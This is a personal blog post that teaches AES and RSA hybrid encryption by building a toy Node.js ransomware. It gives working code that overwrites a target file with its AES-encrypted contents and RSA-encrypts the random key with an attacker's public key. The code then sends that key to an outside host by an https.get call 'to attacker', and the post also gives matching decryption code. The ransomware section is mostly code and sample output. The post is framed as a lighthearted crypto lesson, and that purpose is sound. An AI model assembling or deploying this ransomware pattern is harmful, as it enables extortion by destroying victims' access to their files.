---
layout: post
title: Node.js ransomware
tags: [Node, JS, ransomware, rsa, aes]
comments: true
excerpt: Symmetric encryption (AES) and asymmetric encryption (RSA) in Node.js based on ransomware-like software.
---

(This post is in English language to reach the widest community)

## Node.js, ransomware, what? Node.js virus?

Yeah, sure, why not? Maybe it's not practical, but it's quite interesting.
Also, ransomware software is a great example of symmetric and asymmetric cryptography usage.

So let's see how you do it!

<!-- TOC -->

- [Node.js, ransomware, what? Node.js virus?](#nodejs-ransomware-what-nodejs-virus)
- [Cryptography basics](#cryptography-basics)
  - [Prelude](#prelude)
  - [Asymmetric and symmetric encryption](#asymmetric-and-symmetric-encryption)
    - [Symmetric encryption - AES](#symmetric-encryption---aes)
    - [Asymmetric encryption - RSA](#asymmetric-encryption---rsa)
  - [RSA/AES tandem](#rsaaes-tandem)
- [Ransomware](#ransomware)
- [Node.js ransomware](#nodejs-ransomware)
  - [Required libraries](#required-libraries)
  - [Encryption](#encryption)
    - [AES encryption](#aes-encryption)
    - [RSA encryption](#rsa-encryption)
    - [Summation](#summation)
  - [Decryption](#decryption)
    - [AES decryption](#aes-decryption)
    - [RSA decryption](#rsa-decryption)
    - [Summation](#summation-1)
  - [Example](#example)
- [Epilogue](#epilogue)

<!-- /TOC -->

## Cryptography basics

### Prelude

Cryptography is incredibly important part of today's people daily basis.
From phone calls, text messages to disk-encryption and financial transfers, without cryptography these operations would be insecure enough to allow any third-party powers to mess with them.

Modern cryptography is **never** based on obscurity or *magic*. Its foundation is: mathematics, open scientific papers, goverment agencies and universities.

Though every encryption can be broken, it's strength is calculated as time required to break it. Strong encryption guarantees, that it can sustain many, many days of continuous brute-forcing. Depending on the power of the calculating unit and used encryption technique, it can take from few days to even **few hundred years**.

From practical point of view, attacker wants to break the encryption **as fast as possible**, before the information he wants to aquire becomes obsolete.

The better the encryption is, usually the more limitations it has (like encrypted message size), and takes longer to calculate in the first place, so various encryption are used together to build complete secure chain.

### Asymmetric and symmetric encryption

If message can be encrypted, it should also be decryptable. Messages are encrypted and decrypted using **key** being a number of bytes (or chars). Password is a type of key.

#### Symmetric encryption - AES

The most *basic* (or easiest to understand) encryption is **symmetric encryption**, where the message is decrypted and encrypted using the same key.
One of the most common in today's world symmetric encryption algorithm is [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard). It's [very fast](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard#Performance) and [secure](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard#Security). If you are interested in how it works: search the web. There are some awesome materials for sure!

---

Let's send a message to your roommate, encrypted with AES. Let's also take for granted, that you and your roomate can use [GPG](https://www.gnupg.org/) - **it's not important for the sake of this post though**.

We are going to send him `I like pancakes` encrypted with `asd` password. He really needs to know, that you like pancakes, and it is country-level issue, so it needs to be encrypted.

![]({{ site.url }}/assets/images/node-ransomware/gpg-encryption.png)

Well, we got *some* output, we can send it now somehow to him. Let's use some popular instant-messaging service.

![]({{ site.url }}/assets/images/node-ransomware/gpg-encrypted-sent.png)

Okey, your mate knows it is encrypted with `gpg`, so he uses `gpg -d` on that string, and... needs to enter password. Sure, you know it's `asd`, but how your roommate knows? If he is sitting right behind you or in the room next to yours - not a problem. If he is on a trip to Hawaii, you've got the problem.

You can use *some popular instant-messaging service* again to send the password, but what would be the point to send encrypted message in the first place?

Symmetric encryption is fast and secure, but it does not solve the problem of exchanging keys with message recipient. This is where asymmetric encryption kicks in.

#### Asymmetric encryption - RSA

In opposite to symmetric encryption, asymmetric encryption uses two keys: one for encryption, one for decryption. This way, decryption key can be stored safely on the machine, and encryption key (aka *public key*) can be send literally to the whole world. When someone wants to encrypt something, he uses recipient's public key. Since now, the only thing that can decrypt it, is recipient's decryption key (aka *private key*). That simple, yet incredibly powerful.

I've mentioned earlier, that with great power limitation come. No different in case of [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) - the most popular asymmetric encryption algorithm. It's far slower than AES, and can encrypt only messages not longer, than it's encrypting key. 2048-bit length key (which is 256 bytes) can encrypt only 255 bytes of message. To encrypt typical MP3 file (3MB) it would require to split the file into almost 12 thousands parts. Not very practical. Symmetric encryption has no problem with that!

---

Hypothetically, if we have our's roommate public key, we can use to encrypt `I like pancakes` message, and send it securely to him. Encrypting that way longer messages is - unfortunately - impossible.

### RSA/AES tandem

Although asymmetric encryption cannot be used to encrypt long messages, it can encrypt messages long enough to become symmetric keys.

That's right! We can use one encryption to secure long message, and then use another encryption method to encrypt the key itself, and send it to recipient as one pack (sending key with message seems riddiculous, but since everything is secured, it can be done with only minimal risk).

So how it can work in simple case?

---

1. We need to have symmetric key. We can use a password, but since it doesn't need to be remembered (it will be send alongside message), and passwords tend to be vulnerable to dictionary attacks, we can just generate random bytes. Typical secure AES key length is 256 bits (32 bytes). It is called *AES-256*.
2. We have the key, so we encrypt message with AES.
3. To encrypt with RSA so-called *key-pair* is required. Because we are encrypting message for someone, we need one's public key. We use it to encrypt AES key generated in the first step.
4. We send key and AES to friend via *some popular instant-messaging service*.
5. Friend uses his private key to decrypt AES key, and then uses AES key to decrypt message.
6. Friend knows that we like pancakes.

Note, that we can generate unique symmetric key for each message, which improves security.

## Ransomware

Ransomware virus is software, that - usually - encrypts files on victim's drive, and then expects ransom for decrypting them.

![random money gif](https://media.giphy.com/media/xTiTnqUxyWbsAXq7Ju/giphy.gif)

After discovering security hole in victim's machine ransomware software needs to start encrypting drive fast, before it is detected.
The best way to perform fast encryption is... **symmetric encryption**. This is how tool made for security is used to harm innocents. Irony, isn't it?

Ransomware generates random AES key, and then performs fast encrypting of each approached file. In the meantime it uses attacker's public key to encrypt AES key, and sends it to attacker, so tracking back network traffic to find decrypting key is **meaningless**. Note: I deliberately ignore the fact, that most of the ransomwares don't care about decrypting drive, so they probably don't even bother sending decrypting key anywhere.

## Node.js ransomware

Let's use RSA and AES encryption to encrypt given file, and then send decryption key to given host.

### Required libraries

All of the used libraries are part of newest Node.js versions.

- `crypto`
- `fs`
- `https`

### Encryption

#### AES encryption

Simple AES encryption will be performed by generating 256-bit (32-byte) length key, and using to encrypt given message. The function then will return message, and encrypting key.

```js
const crypto = require('crypto');

const AES_ALGORITHM = 'aes-256-ctr';

/**
 * Function encrypts given input buffer using random AES-256 bit key.
 * Returns key buffer and encrypted message buffer
 *
 * @param {Buffer} message
 */
function aesEncrypt (message) {
    const key = crypto.randomBytes(256 / 8);
    const aes = crypto.createCipher(AES_ALGORITHM, key);
    const encryptedBuffer = aes.update(message);
    aes.final();

    return { message: encryptedBuffer, key }
}
```

#### RSA encryption

To encrypt file with RSA one needs public and private key. Those can be generated using `openssl` application (in OSX or GNU/Linux-likes):

```ssh
$ openssl genrsa -out private.pem 2048
$ openssl rsa -in private.pem -outform PEM -pubout -out public.pem
```

Private key will be stored on attackers machine, and public key will be distributed with ransomware.

```js
const crypto = require('crypto');

/**
 * Function encrypts message with given public key.
 *
 * @param {Buffer} publicKey
 * @param {Buffer} message
 */
function rsaEncrypt (publicKey, message) {
    return crypto.publicEncrypt(publicKey, message);
}
```

#### Summation

```js
const crypto = require('crypto');
const fs = require('fs');
const https = require('https');

const publicKeyBuffer = fs.readFileSync('./public.pem');

const AES_ALGORITHM = 'aes-256-ctr';
const AES_KEY_NAME = './aes-key';
const FILE_TO_ENCRYPT = './file';

/**
 * Function encrypts given input buffer using random AES-256 bit key.
 * Returns key buffer and encrypted message buffer
 *
 * @param {Buffer} message
 */
function aesEncrypt (message) {
    const key = crypto.randomBytes(256 / 8);
    const aes = crypto.createCipher(AES_ALGORITHM, key);
    const encryptedBuffer = aes.update(message);
    aes.final();

    return { message: encryptedBuffer, key }
}

/**
 * Function encrypts message with given public key.
 *
 * @param {Buffer} publicKey
 * @param {Buffer} message
 */
function rsaEncrypt (publicKey, message) {
    return crypto.publicEncrypt(publicKey, message);
}

// Encrypt file buffer with AES, get the encrypted buffer and encryption key back
const fileToEncrypt = fs.readFileSync(FILE_TO_ENCRYPT)
const { message: encryptedFileBuffer, key: encryptionKey } = aesEncrypt(fileToEncrypt);

// Overwrite file with encrypted bytes
fs.writeFileSync(FILE_TO_ENCRYPT, encryptedFileBuffer);

// Encrypt and send key to attacker (and save it to file, for test reasons)
const encryptedKey = rsaEncrypt(publicKeyBuffer, encryptionKey);
https.get(`https://mortmortis.pl/iamnotyourmum/${encryptedKey}/uniqueKeyForVictimIdentification`);
fs.writeFileSync(AES_KEY_NAME, encryptedKey);
```

### Decryption

#### AES decryption

```js
const crypto = require('crypto');

const AES_ALGORITHM = 'aes-256-ctr';

/**
 * Function decrypts encrypted buffer using given key.
 * Returns decrypted message buffer.
 *
 * @param {Buffer} message
 * @param {Buffer} key
 */
function aesDecrypt (message, key) {
    const aes = crypto.createDecipher(AES_ALGORITHM, key);
    const decryptedBuffer = aes.update(message);
    aes.final()

    return { message: decryptedBuffer }
}
```

#### RSA decryption

```js
const crypto = require('crypto');

/**
 * Function decrypts message with given private key.
 *
 * @param {Buffer} privateKey
 * @param {Buffer} message
 */
function rsaDecrypt(privateKey, message) {
    return crypto.privateDecrypt(privateKey, message);
}
```

#### Summation

```js
const crypto = require('crypto');
const fs = require('fs');

const privateKeyBuffer = fs.readFileSync('./private.pem');

const AES_ALGORITHM = 'aes-256-ctr';
const AES_KEY_NAME = './aes-key';
const FILE_TO_DECRYPT = './file';

/**
 * Function decrypts encrypted buffer using given key.
 * Returns decrypted message buffer.
 *
 * @param {Buffer} message
 * @param {Buffer} key
 */
function aesDecrypt (message, key) {
    const aes = crypto.createDecipher(AES_ALGORITHM, key);
    const decryptedBuffer = aes.update(message);
    aes.final()

    return { message: decryptedBuffer }
}

/**
 * Function decrypts message with given private key.
 *
 * @param {Buffer} privateKey
 * @param {Buffer} message
 */
function rsaDecrypt(privateKey, message) {
    return crypto.privateDecrypt(privateKey, message);
}

// Load encrypted file and encrypted key
const encryptedFile = fs.readFileSync(FILE_TO_DECRYPT);
const encryptedKey = fs.readFileSync(AES_KEY_NAME);

// Decrypt key first (this will happen on the attackers side)
const decryptedKey = rsaDecrypt(privateKeyBuffer, encryptedKey);

// Using decrypted key decrypt file
const { message: decryptedMessage } = aesDecrypt(encryptedFile, decryptedKey);

// Save decrypted file
fs.writeFileSync(FILE_TO_DECRYPT, decryptedMessage);
```

### Example

In the code above we encrypt `file`. Let's see how it looks like:

```js
// file
I like pancakes!
```

Obviously, pancakes are the best. No-good for you fellow though, we are going to encrypt that, your precious file will be lost forever until you pay 1000$!

```sh
$ node encryption.js
```

```js
// file
AAƔ���$f:3�wt
```

![evil elmo](https://media.giphy.com/media/yr7n0u3qzO9nG/giphy.gif)

Oh, yes. Pure evil.

Fortunately we saved encrypted symmetric key to `./aes-key` file, and we have private key to decrypt that, because that's just an example. See how it looks:

```
�C�̆ǝ�`�� �a���4�ҷ���#$ۘX�!�E��ݍ��C�?��Sо>&5���9������n�����C������b2j�E卍1�g��?Y��X1� L��2�]���Jڕ �E������7ʫ��?�n����7��r�3�T<� �,Ь��Y��Y<y^�C�z��s���]ա����ݷc
�9U������w��-��!�I�1�HjH܀�A�~��cM������ʚ��n� �#��+�Е
```

Just some non-ascii bytes. No point to bother.

Let's decrypt precious file:

```sh
$ node decryption.js
```

```js
// file
I like pancakes!
```

It's back. What a relief.

## Epilogue

Repository for that project: https://gitlab.com/soanvig/node-rsa-aes

Thank you for reading this post. I hope you learned something.

P.S.

Presented encryption/decryption program is not ready to be used in *production* :-)
